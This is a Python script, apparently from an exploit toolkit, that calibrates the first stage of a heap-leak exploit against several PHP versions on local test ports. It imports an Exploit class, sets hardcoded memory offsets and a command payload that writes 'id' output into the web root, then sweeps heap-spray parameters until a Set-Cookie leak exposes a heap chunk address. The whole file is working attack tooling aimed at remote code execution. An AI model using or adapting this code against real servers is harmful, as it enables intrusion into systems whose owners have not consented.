#!/usr/bin/env python3
"""Stage-1 leak calibration sweep — drives exploit.py's PROVEN Exploit class
(rotate + stage1), NOT a standalone harness.

Usage:
  python calib_leak.py <port> [tries] [mode]
    port   target port (18112=8.3.35 sanity, 18111=8.2.34, 18108=7.4.33)
    tries  stage1 attempts per combo (default 3)
    mode   "sanity" (baseline params only) or "sweep" (vary stage1_n & huge_mb)

Goal: a nonzero chunk base from stage1 = the Set-Cookie heap leak works.
"""
import sys, os, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18111
TRIES = int(sys.argv[2]) if len(sys.argv) > 2 else 3
MODE = sys.argv[3] if len(sys.argv) > 3 else "sweep"

# (stage1_n, huge_mb)
SWEEP = [
    (841, 256), (892, 256),          # bookworm / lab baselines
    (841, 128), (841, 512),          # big-size variation
    (600, 256), (1000, 256),         # filler-count variation
    (700, 256), (941, 256),
    (841, 64),  (841, 1024),
]
SANITY = [(841, 256)]

COMBOS = SANITY if MODE == "sanity" else SWEEP


def make_ex(stage1_n, huge_mb):
    t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=120, verbose=False)
    ex = exploit.Exploit(t, "id>/www/p1",
                         zif_offset=0x3ac080, dtor_offset=0x49ec50,
                         htdata_offset=0x690d8, huge_mb=huge_mb,
                         verbose=False, profile="bookworm")
    ex.stage1_n = stage1_n
    return ex


def leak_once(ex):
    ex.rotate()
    return ex.stage1()


def main():
    print(f"=== stage-1 leak calibration on port {PORT} mode={MODE} ===", flush=True)
    found = None
    for (n, mb) in COMBOS:
        ex = make_ex(n, mb)
        best = 0
        cookie_lens = []
        for i in range(TRIES):
            try:
                c = leak_once(ex)
            except Exception as e:
                print(f"  n={n} mb={mb} try{i}: EXC {type(e).__name__}", flush=True)
                continue
            if c:
                best = max(best, c)
        verdict = "LEAK" if best else "-"
        bs = ("0x%012x" % best) if best else "-"
        print(f"  stage1_n={n} huge_mb={mb} -> best_chunk={bs} {verdict}", flush=True)
        if best and not found:
            found = (n, mb, best)
    if found:
        n, mb, best = found
        print(f"*** FOUND LEAKING COMBO: stage1_n={n} huge_mb={mb} chunk=0x{best:x} ***", flush=True)
        return 0
    print("no leaking combo found", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
